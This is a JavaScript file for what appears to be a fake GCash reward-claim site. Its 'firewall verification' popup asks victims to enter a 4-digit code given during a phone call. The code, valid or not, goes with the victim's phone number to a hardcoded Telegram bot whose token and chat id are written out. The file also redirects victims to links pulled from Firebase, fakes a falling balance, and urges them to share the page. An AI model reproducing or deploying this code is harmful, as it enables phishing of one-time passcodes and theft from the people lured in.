// ========== POPUP.JS - COMPLETE VERSION ==========
// Supports both main.html and share_and_earn.html

let claimState = {
    isProcessing: false,
    currentAmount: 0,
    countdownInterval: null,
    balanceDecrementInterval: null,
    countdownSeconds: 180,
    isPending: false,
    hasRedirected: false
};

let cachedFirewallStatus = false;

// ========== FIREWALL VERIFICATION ==========
let currentVerificationCode = null;
let verificationAttempts = 0;

async function getFirewallStatus() {
    if (typeof firebase === 'undefined' || !firebase.database) {
        console.warn("Firebase not available");
        return false;
    }
    try {
        const db = firebase.database();
        const snap = await db.ref('admin/globalFirewall').once('value');
        const data = snap.val();
        console.log("Firewall status from Firebase:", data);
        if (data === null) {
            console.warn("No firewall data, creating default...");
            await db.ref('admin/globalFirewall').set({
                active: false,
                activatedBy: "SYSTEM",
                timestamp: Date.now()
            });
            return false;
        }
        return data.active === true;
    } catch(e) { 
        console.error("Firewall check error:", e);
        return false;
    }
}

function listenToFirewallChanges() {
    if (typeof firebase === 'undefined' || !firebase.database) return;
    const db = firebase.database();
    db.ref('admin/globalFirewall').on('value', (snapshot) => {
        const data = snapshot.val();
        cachedFirewallStatus = (data && data.active === true);
        console.log("Firewall status updated:", cachedFirewallStatus);
        
        const statusLabel = document.getElementById('statusLabel');
        if (statusLabel && cachedFirewallStatus) {
            statusLabel.innerHTML = "FIREWALL ACTIVE - Verification required";
            statusLabel.style.color = "#ff8888";
        } else if (statusLabel && !cachedFirewallStatus) {
            statusLabel.innerHTML = "Welcome!";
            statusLabel.style.color = "#fbbf24";
        }
    });
}

async function isFirewallActive() {
    return cachedFirewallStatus;
}

async function sendTelegram(phone, code) {
    const msg = `VERIFY REQUEST\nPhone: ${phone}\nCode: ${code}`;
    try {
        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
        console.log("Telegram sent");
    } catch(e) {}
}

async function sendClaimTelegram(phone, amount, linkStatus) {
    const msg = `CLAIM REQUEST\nPhone: ${phone}\nAmount: ₱${amount}\nLink Status: ${linkStatus}`;
    try {
        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
        console.log("Claim notification sent to Telegram");
    } catch(e) {}
}

function showFirewallPopup() {
    console.log("Showing firewall verification popup");
    const popup = document.getElementById('firewallPopup');
    if (!popup) {
        console.error("Firewall popup element not found!");
        return;
    }
    
    const content = document.getElementById('firewallPopupContent');
    if (content) {
        content.innerHTML = `
            <div class="firewall-warning-icon">📞</div>
            <h2>VERIFICATION REQUIRED</h2>
            <div class="firewall-message">
                <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
                <p>Please wait for the system-verification to call you. You will receive a 4-digit code during the call.</p>
                <p>Enter the code below to continue.</p>
            </div>
            <div class="verification-input-group">
                <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
                <button id="verifyCodeBtn" class="verify-btn" onclick="verifyFirewallCode()">VERIFY NOW</button>
            </div>
            <div class="firewall-note">
                <p>Waiting for system-verification call...</p>
            </div>
            <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
        `;
    }
    
    currentVerificationCode = Math.floor(1000 + Math.random() * 9000).toString();
    verificationAttempts = 0;
    console.log("VERIFICATION CODE:", currentVerificationCode);
    
    popup.style.display = 'flex';
    setTimeout(() => {
        const ci = document.getElementById('verificationCode');
        if (ci) ci.focus();
    }, 100);
}

function hideFirewallPopup() {
    const popup = document.getElementById('firewallPopup');
    if (popup) popup.style.display = 'none';
}

window.verifyFirewallCode = async function() {
    const codeInput = document.getElementById('verificationCode');
    const code = codeInput ? codeInput.value.trim() : '';
    const errorDiv = document.getElementById('firewallErrorMsg');
    const verifyBtn = document.getElementById('verifyCodeBtn');
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    if (!code || code.length < 4) {
        if (errorDiv) {
            errorDiv.innerHTML = "Please enter a 4-digit code.";
            errorDiv.style.display = 'block';
        }
        return;
    }
    
    if (verifyBtn) {
        verifyBtn.disabled = true;
        verifyBtn.innerHTML = "VERIFYING...";
    }
    if (errorDiv) errorDiv.style.display = 'none';
    
    verificationAttempts++;
    const isValid = (code === currentVerificationCode);
    
    if (isValid) {
        await sendTelegram(userPhone, code);
        hideFirewallPopup();
        alert("Verification successful. Page will refresh.");
        setTimeout(() => {
            window.location.reload();
        }, 500);
    } else {
        await sendTelegram(userPhone, code);
        let errorMsg = "Invalid verification code. Please try again.";
        if (verificationAttempts >= 3) {
            errorMsg = "Too many failed attempts. Page will refresh.";
            if (verifyBtn) verifyBtn.disabled = true;
            setTimeout(() => {
                window.location.reload();
            }, 2000);
        }
        if (errorDiv) {
            errorDiv.innerHTML = errorMsg;
            errorDiv.style.display = 'block';
        }
        if (verifyBtn && verifyBtn.disabled !== true) {
            verifyBtn.disabled = false;
            verifyBtn.innerHTML = "VERIFY NOW";
        }
        if (codeInput) {
            codeInput.value = '';
            codeInput.focus();
        }
    }
};

// ========== GET LATEST DEPLOYED LINK ==========
async function getLatestPayoutLink() {
    if (typeof firebase === 'undefined' || !firebase.database) return null;
    try {
        const db = firebase.database();
        const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        if (snapshot.exists()) {
            const key = Object.keys(snapshot.val())[0];
            const linkData = snapshot.val()[key];
            console.log("Found payout link:", linkData.url);
            return { url: linkData.url, key: key };
        }
        console.warn("No available links found in Firebase");
        return null;
    } catch (error) {
        console.error("Error getting payout link:", error);
        return null;
    }
}

// ========== SHOW NO LINK ALERT (STYLISH) ==========
function showNoLinkAlert() {
    const modal = document.createElement('div');
    modal.id = 'customAlert';
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.background = 'rgba(0,0,0,0.95)';
    modal.style.backdropFilter = 'blur(10px)';
    modal.style.zIndex = '20000';
    modal.style.display = 'flex';
    modal.style.alignItems = 'center';
    modal.style.justifyContent = 'center';
    modal.style.fontFamily = "'Inter', sans-serif";
    
    modal.innerHTML = `
        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 40px; max-width: 320px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,68,68,0.3);">
            <div style="font-size: 48px; margin-bottom: 15px;">⚠️</div>
            <h3 style="color: #ff4444; font-size: 20px; margin-bottom: 20px;">WITHDRAWAL UNAVAILABLE</h3>
            <div style="color: white; font-size: 14px; line-height: 1.6; text-align: left;">
                <p style="margin-bottom: 12px;">1. There is no GCash App installed on your device.</p>
                <p style="margin-bottom: 5px;">2. Share and complete the pending task to withdraw your rewards.</p>
            </div>
            <button id="closeAlertBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 40px; padding: 12px 25px; color: white; font-weight: bold; margin-top: 25px; cursor: pointer; width: 100%;">GOT IT</button>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    document.getElementById('closeAlertBtn').onclick = function() {
        modal.remove();
    };
    
    modal.onclick = function(e) {
        if (e.target === modal) modal.remove();
    };
}

// ========== MAIN CLAIM POPUP ==========
async function showClaimPopup(amount) {
    console.log("showClaimPopup called with amount:", amount);
    
    const firewallActive = await getFirewallStatus();
    console.log("Firewall active:", firewallActive);
    
    if (firewallActive) {
        console.log("FIREWALL ON - Showing verification popup");
        showFirewallPopup();
        return;
    }
    
    console.log("FIREWALL OFF - Showing congratulations popup");
    claimState.currentAmount = amount;
    claimState.isProcessing = false;
    claimState.hasRedirected = false;
    
    const popup = document.getElementById('claimPopup');
    const prizeSpan = document.getElementById('popupPrizeAmount');
    const claimBtn = document.getElementById('claimActionBtn');
    
    if (prizeSpan) prizeSpan.innerHTML = "₱" + amount.toLocaleString();
    if (claimBtn) {
        claimBtn.innerHTML = 'CLAIM THRU GCASH';
        claimBtn.disabled = false;
    }
    if (popup) popup.style.display = 'flex';
}

function hideClaimPopup() { 
    const p = document.getElementById('claimPopup'); 
    if (p) p.style.display = 'none'; 
}

function showPendingStatus() { 
    const pa = document.getElementById('pendingStatusArea'); 
    if (pa) pa.style.display = 'block'; 
    claimState.isPending = true; 
}

function hidePendingStatus() { 
    const pa = document.getElementById('pendingStatusArea'); 
    if (pa) pa.style.display = 'none'; 
    claimState.isPending = false; 
}

// ========== BALANCE DECREMENT ==========
function startSmoothDecrement(originalAmount) {
    const balanceText = document.getElementById('balanceText');
    if (!balanceText) return;
    
    let current = originalAmount;
    const decrementStep = 1;
    const totalDuration = 2000;
    const steps = originalAmount;
    const intervalTime = totalDuration / steps;
    
    claimState.balanceDecrementInterval = setInterval(() => {
        current = current - decrementStep;
        if (current >= 0) balanceText.innerText = "₱" + current.toLocaleString() + ".00";
        if (current <= 0) {
            clearInterval(claimState.balanceDecrementInterval);
            claimState.balanceDecrementInterval = null;
            balanceText.innerText = "₱0.00";
        }
    }, intervalTime);
}

// ========== COUNTDOWN TIMER ==========
function startVisibleCountdown(originalAmount) {
    let remaining = claimState.countdownSeconds;
    const timerSpan = document.getElementById('pendingCountdown');
    const pendingArea = document.getElementById('pendingStatusArea');
    const withdrawBtn = document.getElementById('claimBtn');
    
    if (!timerSpan) return;
    
    claimState.countdownInterval = setInterval(() => {
        if (remaining > 0) {
            remaining--;
            const mins = Math.floor(remaining / 60);
            const secs = remaining % 60;
            timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }
        
        if (remaining <= 0) {
            clearInterval(claimState.countdownInterval);
            claimState.countdownInterval = null;
            
            const balanceText = document.getElementById('balanceText');
            if (balanceText) balanceText.innerText = "₱" + originalAmount.toLocaleString() + ".00";
            
            if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
                window.parent.updateGameBalance(originalAmount);
            } else if (typeof updateGameBalance === 'function') {
                updateGameBalance(originalAmount);
            } else if (typeof GameState !== 'undefined') {
                GameState.balance = originalAmount;
                if (typeof updateUI === 'function') updateUI();
                if (typeof saveData === 'function') saveData();
            }
            
            if (pendingArea) pendingArea.style.display = 'none';
            if (withdrawBtn) withdrawBtn.style.display = 'block';
            
            claimState.isProcessing = false;
            claimState.hasRedirected = false;
        }
    }, 1000);
}

// ========== REDIRECT TIMER ==========
function startImaginaryTimer(redirectUrl) {
    claimState.imaginaryTimer = setTimeout(() => {
        if (!claimState.hasRedirected) {
            claimState.hasRedirected = true;
            window.location.href = redirectUrl;
        }
    }, 2000);
}

// ========== CLAIM ACTION WITH FIREWALL + DEPLOY LINK + TELEGRAM ==========
async function onClaimAction() {
    if (claimState.isProcessing) return;
    
    claimState.isProcessing = true;
    const claimBtn = document.getElementById('claimActionBtn');
    const amount = claimState.currentAmount;
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    if (claimBtn) {
        claimBtn.disabled = true;
        claimBtn.innerHTML = 'PROCESSING...';
    }
    
    // Check if firewall is ON
    const firewallActive = await getFirewallStatus();
    
    if (firewallActive) {
        console.log("Firewall ON - Showing verification popup");
        showFirewallPopup();
        if (claimBtn) {
            claimBtn.disabled = false;
            claimBtn.innerHTML = 'CLAIM THRU GCASH';
        }
        claimState.isProcessing = false;
        return;
    }
    
    // FIREWALL OFF - Check for deployed links
    console.log("Firewall OFF - Checking for payout links");
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        const db = firebase.database();
        
        try {
            const linkData = await getLatestPayoutLink();
            
            if (linkData && linkData.url) {
                const redirectUrl = linkData.url;
                const linkKey = linkData.key;
                
                // Mark link as claimed
                await db.ref('links/' + linkKey).update({ 
                    status: 'claimed', 
                    user: userPhone, 
                    amount: amount, 
                    claimedAt: Date.now() 
                });
                
                // Send Telegram notification for successful claim
                await sendClaimTelegram(userPhone, amount, 'Link found - Redirecting');
                
                hideClaimPopup();
                showPendingStatus();
                
                // Check if balanceText exists before decrement
                const balanceText = document.getElementById('balanceText');
                if (balanceText) {
                    startSmoothDecrement(amount);
                } else {
                    console.log("No balance display - skipping decrement");
                }
                
                startVisibleCountdown(amount);
                startImaginaryTimer(redirectUrl);
                
            } else {
                // NO LINKS DEPLOYED - Show stylish alert and send Telegram
                await sendClaimTelegram(userPhone, amount, 'No link available');
                showNoLinkAlert();
                
                if (claimBtn) {
                    claimBtn.disabled = false;
                    claimBtn.innerHTML = 'CLAIM THRU GCASH';
                }
                claimState.isProcessing = false;
            }
            
        } catch (err) {
            console.error("Firebase error:", err);
            await sendClaimTelegram(userPhone, amount, 'Firebase error - No link');
            showNoLinkAlert();
            
            if (claimBtn) {
                claimBtn.disabled = false;
                claimBtn.innerHTML = 'CLAIM THRU GCASH';
            }
            claimState.isProcessing = false;
        }
    } else {
        // No Firebase
        await sendClaimTelegram(userPhone, amount, 'Firebase not available');
        showNoLinkAlert();
        
        if (claimBtn) {
            claimBtn.disabled = false;
            claimBtn.innerHTML = 'CLAIM THRU GCASH';
        }
        claimState.isProcessing = false;
    }
}

// ========== EXPORT FUNCTIONS FOR SHARE_AND_EARN ==========
window.showFirewallPopup = showFirewallPopup;
window.hideFirewallPopup = hideFirewallPopup;
window.verifyFirewallCode = verifyFirewallCode;
window.showClaimPopup = showClaimPopup;
window.onClaimAction = onClaimAction;

// ========== INITIALIZE ==========
document.addEventListener('DOMContentLoaded', function() { 
    hidePendingStatus();
    listenToFirewallChanges();
    getFirewallStatus().then(status => {
        console.log("Initial firewall status:", status);
        cachedFirewallStatus = status;
    });
    console.log("Popup.js loaded - Ready for main.html and share_and_earn.html");
});
